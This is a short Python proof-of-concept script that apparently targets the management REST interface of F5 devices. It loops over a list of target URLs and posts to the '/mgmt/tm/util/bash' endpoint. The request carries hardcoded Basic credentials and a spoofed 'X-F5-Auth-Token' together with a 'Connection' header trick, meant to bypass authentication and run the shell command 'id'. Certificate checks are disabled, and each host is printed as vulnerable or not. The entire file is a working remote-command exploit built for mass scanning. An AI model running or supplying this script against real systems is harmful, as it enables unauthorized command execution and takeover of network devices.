import requests
import re
import urllib3
from urllib import parse

requests.packages.urllib3.disable_warnings()

def poc():
	for url in open("target.txt"):
		url=url.strip()
		vulnurl=url + "/mgmt/tm/util/bash"
		print(vulnurl)
		headers = {
        "Authorization": "Basic YWRtaW46aG9yaXpvbjM=",
        "X-F5-Auth-Token": "ads",
        "Connection": "X-F5-Auth-Token",
        "Content-Type": "application/json"
           
    }
		data='{"command":"run","utilCmdArgs":"-c id"}'
		try:
			res=requests.post(vulnurl,data=data,headers=headers,verify=False,timeout=5)
			if "command" in res.text and res.status_code==200:
				print("\033[32m[+]%s is vuln 漏洞存在 ，\033[0m" %vulnurl)
			else:
				print("\033[32m[+]%s is not vuln ，\033[0m" %vulnurl)
		except Exception as e:
			print(e)

if __name__ == '__main__':
    poc()
